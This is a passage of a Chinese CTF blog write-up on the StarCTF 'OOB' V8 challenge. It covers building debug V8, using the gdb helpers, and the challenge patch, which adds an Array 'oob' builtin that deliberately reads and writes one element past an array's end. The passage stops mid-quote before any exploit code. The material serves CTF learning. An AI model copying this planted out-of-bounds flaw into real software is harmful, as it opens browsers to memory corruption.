@@ -1,0 +1,563 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>StarCTF-OOB-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕"><meta property="og:image" content><meta property="og:title" content="StarCTF-OOB-WP"><meta property="og:description" content="博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/pwnreview/1561.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-16T15:50:00+00:00"><meta property="article:modified_time" content="2021-11-16T15:50:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="StarCTF-OOB-WP"><meta name=twitter:description content="博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>StarCTF-OOB-WP</h1><div class=meta>Posted on Nov 16, 2021</div></div><section class=body><p>博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕竟没啥意思。不过上个星期的深育杯和 l3ctf 倒是都碰到了新东西，深育杯有一个 Jerry script pwn 和 fastjson pwn。jerryscript 这个之前津门杯也碰到了，但是没有找到 wp 就一直没去复现，所以一直没搞懂，这次又碰到了，既然有官方 wp，就尝试复现一下。fastjson 那个，确实没听说过，有机会也复现一下。l3ctf 则非常时髦，一个似乎是 window 内核 pwn，确实是超出知识面了，还有一个是带 llvm address sanitizer 的 pwn，具体由于时间不够也没仔细分析。不知道官方会不会发布 wp，希望可以跟着复现一下。看来最近能弄的东西还挺多，突然又有了明确的目标了，挺好。下一步先了解一下 Jerry Script 的基本利用方式吧。</p><p>v8 的利用是很早之前就想学了，不过一直觉得自己的知识储备可能还是不够，就没有开始。先是入门了一下设计模式和编译原理，最近又翻了翻侯捷老师的《STL 源码剖析》，了解了一些 C++ GP 的设计。但是确实一直没有明确的目标，所以进展比较慢，最后还是决定不管太多，直接开始上题，不得不说做题确实是最简单的学习方式了，通过这道题也是了解了一点 v8 的对象存储结构。不过此题倒是和 v8 的编译过程没有什么关系，之后再学习吧。</p><p>这道题是一道入门 v8 pwn 题，网络上相关的资料非常多，所以这篇 wp 也只是写给自己看看，建议参考<a href=https://www.xi4oyu.top/3b546c3b/>小语的 wp</a>。</p><h3 id=基本的出题方法>基本的出题方法</h3><p>给出一个靶机跑的浏览器以及相关依赖和一个 patch 文件。这个 patch 向 v8 中埋了洞，我们要做的就是理解并利用该漏洞。</p><h3 id=环境搭建>环境搭建</h3><p>题目如果只给一个浏览器，那调试起来应该会非常痛苦，所以我们会根据题目的引擎版本自己构建一个对应的 debug 版本的引擎。整个构建过程比较繁琐。</p><p>安装一些依赖：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sudo apt install binutils python2.7 perl socat git build-essential gdb gdbserver
+</span></span></code></pre></div><p>首先需要获取相关的工具链，主要需要的是 depot_tools 和 ninja。</p><p>depot_tools 可以从 github 上 clone 下来，然后加到 PATH 里面就行了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+</span></span><span style=display:flex><span><span style=color:#007020>echo</span> <span style=color:#4070a0>&#39;export PATH=$PATH:&#34;/path/to/depot_tools&#34;&#39;</span> &gt;&gt; ~/.bashrc
+</span></span></code></pre></div><p>ninja 不建议 apt 安装，版本太老了，最好是编译安装</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>git clone <span style=color:#002070;font-weight:700>https</span>:<span style=color:#60a0b0;font-style:italic>//github.com/ninja-build/ninja.git
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>cd ninja
+</span></span><span style=display:flex><span>.<span style=color:#666>/</span>configure.py <span style=color:#666>--</span>bootstrap
+</span></span><span style=display:flex><span>sudo cp ninja <span style=color:#666>/</span>usr<span style=color:#666>/</span>bin<span style=color:#666>/</span>
+</span></span></code></pre></div><p>然后获取源码并编译</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fetch v8 <span style=color:#60a0b0;font-style:italic># 使用 depot_tools 拉取源码</span>
+</span></span><span style=display:flex><span><span style=color:#007020>cd</span> v8
+</span></span><span style=display:flex><span>gclient sync <span style=color:#60a0b0;font-style:italic># 更新源码，这里可以不执行，因为 depot_tools 拉取的已经是最新的了 </span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># 编译可以直接使用提供脚本的编译，ninja 会自动使用全核进行编译</span>
+</span></span><span style=display:flex><span>tools/dev/v8gen.py x64.debug <span style=color:#666>&amp;&amp;</span> ninja -C out.gn/x64.debug <span style=color:#60a0b0;font-style:italic># debug 版本</span>
+</span></span><span style=display:flex><span>tools/dev/v8gen.py x64.release <span style=color:#666>&amp;&amp;</span> ninja -C out.gn/x64.release <span style=color:#60a0b0;font-style:italic># release 版本</span>
+</span></span></code></pre></div><p>编译出来的目标文件存于 out.gn/x64.*** 中，d8 就是引擎，直接运行会启动一个交互式的 shell，提供 js 文件就可以直接该脚本。</p><p>这个编译过程还是比较久的，为了不浪费太多人生，可以先不编译，之后直接编译题目所需的版本就可以了。</p><p>v8 同时提供里 gdb 的调试支持，位于 <code>v8/tools/</code> 中，在 <code>~/.gdbinit</code> 中加入以下两行</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#007020>source</span> /path_to_v8/tools/gdbinit
+</span></span><span style=display:flex><span><span style=color:#007020>source</span> /path_to_v8/tools/gdb-v8-support.py
+</span></span></code></pre></div><p>就可以启用调试支持。</p><p>主要的有 <code>job</code> 命令，可以显示对应地址的中对象的细节，比如对一个函数对象执行 <code>job</code>，可以获得</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; job 0x2a21e74e24e1
+</span></span><span style=display:flex><span>0x2a21e74e24e1: <span style=color:#666>[</span>Function<span style=color:#666>]</span> in OldSpace
+</span></span><span style=display:flex><span> - map: 0x2e2a97744379 &lt;Map<span style=color:#666>(</span>HOLEY_ELEMENTS<span style=color:#666>)</span>&gt; <span style=color:#666>[</span>FastProperties<span style=color:#666>]</span>
+</span></span><span style=display:flex><span> - prototype: 0x2a21e74c2109 &lt;JSFunction <span style=color:#666>(</span><span style=color:#bb60d5>sfi</span> <span style=color:#666>=</span> 0x3b2784bc3b29<span style=color:#666>)</span>&gt;
+</span></span><span style=display:flex><span> - elements: 0x0e279b5c0c71 &lt;FixedArray<span style=color:#666>[</span>0<span style=color:#666>]</span>&gt; <span style=color:#666>[</span>HOLEY_ELEMENTS<span style=color:#666>]</span>
+</span></span><span style=display:flex><span> - <span style=color:#007020;font-weight:700>function</span> prototype: &lt;no-prototype-slot&gt;
+</span></span><span style=display:flex><span> - shared_info: 0x2a21e74e24a9 &lt;SharedFunctionInfo 0&gt;
+</span></span><span style=display:flex><span> - name: 0x0e279b5c4ae1 &lt;String<span style=color:#666>[</span><span style=color:#60a0b0;font-style:italic>#1]: 0&gt;</span>
+</span></span><span style=display:flex><span> - formal_parameter_count: <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span> - kind: NormalFunction
+</span></span><span style=display:flex><span> - context: 0x2a21e74c1869 &lt;NativeContext<span style=color:#666>[</span>246<span style=color:#666>]</span>&gt;
+</span></span><span style=display:flex><span> - code: 0x118c79942001 &lt;Code JS_TO_WASM_FUNCTION&gt;
+</span></span><span style=display:flex><span> - WASM instance 0x2a21e74e22e9
+</span></span><span style=display:flex><span> - WASM <span style=color:#007020;font-weight:700>function</span> index <span style=color:#40a070>0</span>
+</span></span><span style=display:flex><span> - properties: 0x0e279b5c0c71 &lt;FixedArray<span style=color:#666>[</span>0<span style=color:#666>]</span>&gt; <span style=color:#666>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#length: 0x3b2784bc04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#name: 0x3b2784bc0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#arguments: 0x3b2784bc0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>#caller: 0x3b2784bc03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
+</span></span><span style=display:flex><span> <span style=color:#666>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> - feedback vector: not available
+</span></span></code></pre></div><p>同时我们还可以通过在 js 文件中加入 <code>%SystemBreak()</code> 和 <code>%DebugPrint(object)</code>，前者可以起到断点的作用，后者可以打出 object 的地址和类型。</p><h3 id=漏洞分析>漏洞分析</h3><p>diff 文件如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>bootstrapper.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>bootstrapper.cc
+</span></span><span style=display:flex><span>index b027d36..ef1002f <span style=color:#40a070>100644</span>
+</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>bootstrapper.cc
+</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>bootstrapper.cc
+</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>1668</span>,<span style=color:#40a070>6</span> <span style=color:#666>+</span><span style=color:#40a070>1668</span>,<span style=color:#40a070>8</span> <span>@@</span> <span style=color:#902000>void</span> Genesis<span style=color:#666>::</span>InitializeGlobal(Handle<span style=color:#666>&lt;</span>JSGlobalObject<span style=color:#666>&gt;</span> global_object,
+</span></span><span style=display:flex><span><span style=color:#40a070>1668</span><span style=color:#666>:</span>                           Builtins<span style=color:#666>::</span>kArrayPrototypeCopyWithin, <span style=color:#40a070>2</span>, <span style=color:#007020>false</span>);
+</span></span><span style=display:flex><span><span style=color:#40a070>1669</span><span style=color:#666>:</span>     SimpleInstallFunction(isolate_, proto, <span style=color:#4070a0>&#34;fill&#34;</span>,
+</span></span><span style=display:flex><span><span style=color:#40a070>1670</span><span style=color:#666>:</span>                           Builtins<span style=color:#666>::</span>kArrayPrototypeFill, <span style=color:#40a070>1</span>, <span style=color:#007020>false</span>);
+</span></span><span style=display:flex><span><span style=color:#40a070>1671</span><span style=color:#666>:+</span>    SimpleInstallFunction(isolate_, proto, <span style=color:#4070a0>&#34;oob&#34;</span>,
+</span></span><span style=display:flex><span><span style=color:#40a070>1672</span><span style=color:#666>:+</span>                          Builtins<span style=color:#666>::</span>kArrayOob,<span style=color:#40a070>2</span>,<span style=color:#007020>false</span>);
+</span></span><span style=display:flex><span><span style=color:#40a070>1673</span><span style=color:#666>:</span>     SimpleInstallFunction(isolate_, proto, <span style=color:#4070a0>&#34;find&#34;</span>,
+</span></span><span style=display:flex><span><span style=color:#40a070>1674</span><span style=color:#666>:</span>                           Builtins<span style=color:#666>::</span>kArrayPrototypeFind, <span style=color:#40a070>1</span>, <span style=color:#007020>false</span>);
+</span></span><span style=display:flex><span><span style=color:#40a070>1675</span><span style=color:#666>:</span>     SimpleInstallFunction(isolate_, proto, <span style=color:#4070a0>&#34;findIndex&#34;</span>,
+</span></span><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc
+</span></span><span style=display:flex><span>index <span style=color:#40a070>8</span>df340e.<span style=color:#40a070>.9</span>b828ab <span style=color:#40a070>100644</span>
+</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc
+</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc
+</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>361</span>,<span style=color:#40a070>6</span> <span style=color:#666>+</span><span style=color:#40a070>361</span>,<span style=color:#40a070>27</span> <span>@@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate<span style=color:#666>*</span> isolate,
+</span></span><span style=display:flex><span><span style=color:#40a070>361</span><span style=color:#666>:</span>   <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>final_length;
+</span></span><span style=display:flex><span><span style=color:#40a070>362</span><span style=color:#666>:</span> }
+</span></span><span style=display:flex><span><span style=color:#40a070>363</span><span style=color:#666>:</span> }  <span style=color:#60a0b0;font-style:italic>// namespace
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>364</span><span style=color:#666>:+</span>BUILTIN(ArrayOob){
+</span></span><span style=display:flex><span><span style=color:#40a070>365</span><span style=color:#666>:+</span>    <span style=color:#902000>uint32_t</span> len <span style=color:#666>=</span> args.length();
+</span></span><span style=display:flex><span><span style=color:#40a070>366</span><span style=color:#666>:+</span>    <span style=color:#007020;font-weight:700>if</span>(len <span style=color:#666>&gt;</span> <span style=color:#40a070>2</span>) <span style=color:#007020;font-weight:700>return</span> ReadOnlyRoots(isolate).undefined_value();
+</span></span><span style=display:flex><span><span style=color:#40a070>367</span><span style=color:#666>:+</span>    Handle<span style=color:#666>&lt;</span>JSReceiver<span style=color:#666>&gt;</span> receiver;
+</span></span><span style=display:flex><span><span style=color:#40a070>368</span><span style=color:#666>:+</span>    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span><span style=display:flex><span><span style=color:#40a070>369</span><span style=color:#666>:+</span>            isolate, receiver, Object<span style=color:#666>::</span>ToObject(isolate, args.receiver()));
+</span></span><span style=display:flex><span><span style=color:#40a070>370</span><span style=color:#666>:+</span>    Handle<span style=color:#666>&lt;</span>JSArray<span style=color:#666>&gt;</span> array <span style=color:#666>=</span> Handle<span style=color:#666>&lt;</span>JSArray<span style=color:#666>&gt;::</span>cast(receiver);
+</span></span><span style=display:flex><span><span style=color:#40a070>371</span><span style=color:#666>:+</span>    FixedDoubleArray elements <span style=color:#666>=</span> FixedDoubleArray<span style=color:#666>::</span>cast(array<span style=color:#666>-&gt;</span>elements());
+</span></span><span style=display:flex><span><span style=color:#40a070>372</span><span style=color:#666>:+</span>    <span style=color:#902000>uint32_t</span> length <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>static_cast</span><span style=color:#666>&lt;</span><span style=color:#902000>uint32_t</span><span style=color:#666>&gt;</span>(array<span style=color:#666>-&gt;</span>length()<span style=color:#666>-&gt;</span>Number());
+</span></span><span style=display:flex><span><span style=color:#40a070>373</span><span style=color:#666>:+</span>    <span style=color:#007020;font-weight:700>if</span>(len <span style=color:#666>==</span> <span style=color:#40a070>1</span>){
+</span></span><span style=display:flex><span><span style=color:#40a070>374</span><span style=color:#666>:+</span>        <span style=color:#60a0b0;font-style:italic>//read
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>375</span><span style=color:#666>:+</span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>(isolate<span style=color:#666>-&gt;</span>factory()<span style=color:#666>-&gt;</span>NewNumber(elements.get_scalar(length)));
+</span></span><span style=display:flex><span><span style=color:#40a070>376</span><span style=color:#666>:+</span>    }<span style=color:#007020;font-weight:700>else</span>{
+</span></span><span style=display:flex><span><span style=color:#40a070>377</span><span style=color:#666>:+</span>        <span style=color:#60a0b0;font-style:italic>//write
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>378</span><span style=color:#666>:+</span>        Handle<span style=color:#666>&lt;</span>Object<span style=color:#666>&gt;</span> value;
+</span></span><span style=display:flex><span><span style=color:#40a070>379</span><span style=color:#666>:+</span>        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span><span style=display:flex><span><span style=color:#40a070>380</span><span style=color:#666>:+</span>                isolate, value, Object<span style=color:#666>::</span>ToNumber(isolate, args.at<span style=color:#666>&lt;</span>Object<span style=color:#666>&gt;</span>(<span style=color:#40a070>1</span>)));
+</span></span><span style=display:flex><span><span style=color:#40a070>381</span><span style=color:#666>:+</span>        elements.set(length,value<span style=color:#666>-&gt;</span>Number());
+</span></span><span style=display:flex><span><span style=color:#40a070>382</span><span style=color:#666>:+</span>        <span style=color:#007020;font-weight:700>return</span> ReadOnlyRoots(isolate).undefined_value();
+</span></span><span style=display:flex><span><span style=color:#40a070>383</span><span style=color:#666>:+</span>    }
+</span></span><span style=display:flex><span><span style=color:#40a070>384</span><span style=color:#666>:+</span>}
+</span></span><span style=display:flex><span><span style=color:#40a070>385</span><span style=color:#666>:</span> 
+</span></span><span style=display:flex><span><span style=color:#40a070>386</span><span style=color:#666>:</span> BUILTIN(ArrayPush) {
+</span></span><span style=display:flex><span><span style=color:#40a070>387</span><span style=color:#666>:</span>   HandleScope scope(isolate);
+</span></span><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>definitions.h b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>definitions.h
+</span></span><span style=display:flex><span>index <span style=color:#40a070>0447230.</span>.f113a81 <span style=color:#40a070>100644</span>
+</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>definitions.h
+</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>definitions.h
+</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>368</span>,<span style=color:#40a070>6</span> <span style=color:#666>+</span><span style=color:#40a070>368</span>,<span style=color:#40a070>7</span> <span>@@</span> <span style=color:#007020;font-weight:700>namespace</span> internal {
+</span></span><span style=display:flex><span><span style=color:#40a070>368</span><span style=color:#666>:</span>   TFJ(ArrayPrototypeFlat, SharedFunctionInfo<span style=color:#666>::</span>kDontAdaptArgumentsSentinel)     \
+</span></span><span style=display:flex><span><span style=color:#40a070>369</span><span style=color:#666>:</span>   <span style=color:#60a0b0;font-style:italic>/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \
+</span></span><span style=display:flex><span><span style=color:#40a070>370</span><span style=color:#666>:</span>   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo<span style=color:#666>::</span>kDontAdaptArgumentsSentinel)  \
+</span></span><span style=display:flex><span><span style=color:#40a070>371</span><span style=color:#666>:+</span>  CPP(ArrayOob)                                                                \
+</span></span><span style=display:flex><span><span style=color:#40a070>372</span><span style=color:#666>:</span>                                                                                \
+</span></span><span style=display:flex><span><span style=color:#40a070>373</span><span style=color:#666>:</span>   <span style=color:#60a0b0;font-style:italic>/* ArrayBuffer */</span>                                                            \
+</span></span><span style=display:flex><span><span style=color:#40a070>374</span><span style=color:#666>:</span>   <span style=color:#60a0b0;font-style:italic>/* ES #sec-arraybuffer-constructor */</span>                                        \
+</span></span><span style=display:flex><span>diff <span style=color:#666>--</span>git a<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>typer.cc b<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>typer.cc
+</span></span><span style=display:flex><span>index ed1e4a5..c199e3a <span style=color:#40a070>100644</span>
+</span></span><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>typer.cc
+</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>compiler<span style=color:#666>/</span>typer.cc
+</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>1680</span>,<span style=color:#40a070>6</span> <span style=color:#666>+</span><span style=color:#40a070>1680</span>,<span style=color:#40a070>8</span> <span>@@</span> Type Typer<span style=color:#666>::</span>Visitor<span style=color:#666>::</span>JSCallTyper(Type fun, Typer<span style=color:#666>*</span> t) {
+</span></span><span style=display:flex><span><span style=color:#40a070>1680</span><span style=color:#666>:</span>       <span style=color:#007020;font-weight:700>return</span> Type<span style=color:#666>::</span>Receiver();
+</span></span><span style=display:flex><span><span style=color:#40a070>1681</span><span style=color:#666>:</span>     <span style=color:#007020;font-weight:700>case</span> Builtins<span style=color:#666>::</span><span style=color:#002070;font-weight:700>kArrayUnshift</span>:
+</span></span><span style=display:flex><span><span style=color:#40a070>1682</span><span style=color:#666>:</span>       <span style=color:#007020;font-weight:700>return</span> t<span style=color:#666>-&gt;</span>cache_<span style=color:#666>-&gt;</span>kPositiveSafeInteger;
+</span></span><span style=display:flex><span><span style=color:#40a070>1683</span><span style=color:#666>:+</span>    <span style=color:#007020;font-weight:700>case</span> Builtins<span style=color:#666>::</span><span style=color:#002070;font-weight:700>kArrayOob</span>:
+</span></span><span style=display:flex><span><span style=color:#40a070>1684</span><span style=color:#666>:+</span>      <span style=color:#007020;font-weight:700>return</span> Type<span style=color:#666>::</span>Receiver();
+</span></span><span style=display:flex><span><span style=color:#40a070>1685</span><span style=color:#666>:</span> 
+</span></span><span style=display:flex><span><span style=color:#40a070>1686</span><span style=color:#666>:</span>     <span style=color:#60a0b0;font-style:italic>// ArrayBuffer functions.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>1687</span><span style=color:#666>:</span>     <span style=color:#007020;font-weight:700>case</span> Builtins<span style=color:#666>::</span><span style=color:#002070;font-weight:700>kArrayBufferIsView</span>:
+</span></span></code></pre></div><p>可以看到 patch 后给内建数组添加了一个 oob 方法，该方法的实现为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#666>---</span> a<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc
+</span></span><span style=display:flex><span><span style=color:#666>+++</span> b<span style=color:#666>/</span>src<span style=color:#666>/</span>builtins<span style=color:#666>/</span>builtins<span style=color:#666>-</span>array.cc
+</span></span><span style=display:flex><span><span>@@</span> <span style=color:#666>-</span><span style=color:#40a070>361</span>,<span style=color:#40a070>6</span> <span style=color:#666>+</span><span style=color:#40a070>361</span>,<span style=color:#40a070>27</span> <span>@@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate<span style=color:#666>*</span> isolate,
+</span></span><span style=display:flex><span><span style=color:#40a070>361</span><span style=color:#666>:</span>   <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>final_length;
+</span></span><span style=display:flex><span><span style=color:#40a070>362</span><span style=color:#666>:</span> }
+</span></span><span style=display:flex><span><span style=color:#40a070>363</span><span style=color:#666>:</span> }  <span style=color:#60a0b0;font-style:italic>// namespace
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>364</span><span style=color:#666>:+</span>BUILTIN(ArrayOob){
+</span></span><span style=display:flex><span><span style=color:#40a070>365</span><span style=color:#666>:+</span>    <span style=color:#902000>uint32_t</span> len <span style=color:#666>=</span> args.length();
+</span></span><span style=display:flex><span><span style=color:#40a070>366</span><span style=color:#666>:+</span>    <span style=color:#007020;font-weight:700>if</span>(len <span style=color:#666>&gt;</span> <span style=color:#40a070>2</span>) <span style=color:#007020;font-weight:700>return</span> ReadOnlyRoots(isolate).undefined_value();
+</span></span><span style=display:flex><span><span style=color:#40a070>367</span><span style=color:#666>:+</span>    Handle<span style=color:#666>&lt;</span>JSReceiver<span style=color:#666>&gt;</span> receiver;
+</span></span><span style=display:flex><span><span style=color:#40a070>368</span><span style=color:#666>:+</span>    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span><span style=display:flex><span><span style=color:#40a070>369</span><span style=color:#666>:+</span>            isolate, receiver, Object<span style=color:#666>::</span>ToObject(isolate, args.receiver()));
+</span></span><span style=display:flex><span><span style=color:#40a070>370</span><span style=color:#666>:+</span>    Handle<span style=color:#666>&lt;</span>JSArray<span style=color:#666>&gt;</span> array <span style=color:#666>=</span> Handle<span style=color:#666>&lt;</span>JSArray<span style=color:#666>&gt;::</span>cast(receiver);
+</span></span><span style=display:flex><span><span style=color:#40a070>371</span><span style=color:#666>:+</span>    FixedDoubleArray elements <span style=color:#666>=</span> FixedDoubleArray<span style=color:#666>::</span>cast(array<span style=color:#666>-&gt;</span>elements());
+</span></span><span style=display:flex><span><span style=color:#40a070>372</span><span style=color:#666>:+</span>    <span style=color:#902000>uint32_t</span> length <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>static_cast</span><span style=color:#666>&lt;</span><span style=color:#902000>uint32_t</span><span style=color:#666>&gt;</span>(array<span style=color:#666>-&gt;</span>length()<span style=color:#666>-&gt;</span>Number());
+</span></span><span style=display:flex><span><span style=color:#40a070>373</span><span style=color:#666>:+</span>    <span style=color:#007020;font-weight:700>if</span>(len <span style=color:#666>==</span> <span style=color:#40a070>1</span>){
+</span></span><span style=display:flex><span><span style=color:#40a070>374</span><span style=color:#666>:+</span>        <span style=color:#60a0b0;font-style:italic>//read
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>375</span><span style=color:#666>:+</span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>*</span>(isolate<span style=color:#666>-&gt;</span>factory()<span style=color:#666>-&gt;</span>NewNumber(elements.get_scalar(length)));
+</span></span><span style=display:flex><span><span style=color:#40a070>376</span><span style=color:#666>:+</span>    }<span style=color:#007020;font-weight:700>else</span>{
+</span></span><span style=display:flex><span><span style=color:#40a070>377</span><span style=color:#666>:+</span>        <span style=color:#60a0b0;font-style:italic>//write
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#40a070>378</span><span style=color:#666>:+</span>        Handle<span style=color:#666>&lt;</span>Object<span style=color:#666>&gt;</span> value;
+</span></span><span style=display:flex><span><span style=color:#40a070>379</span><span style=color:#666>:+</span>        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span><span style=display:flex><span><span style=color:#40a070>380</span><span style=color:#666>:+</span>                isolate, value, Object<span style=color:#666>::</span>ToNumber(isolate, args.at<span style=color:#666>&lt;</span>Object<span style=color:#666>&gt;</span>(<span style=color:#40a070>1</span>)));
+</span></span><span style=display:flex><span><span style=color:#40a070>381</span><span style=color:#666>:+</span>        elements.set(length,value<span style=color:#666>-&gt;</span>Number());
+</span></span><span style=display:flex><span><span style=color:#40a070>382</span><span style=color:#666>:+</span>        <span style=color:#007020;font-weight:700>return</span> ReadOnlyRoots(isolate).undefined_value();
+</span></span><span style=display:flex><span><span style=color:#40a070>383</span><span style=color:#666>:+</span>    }
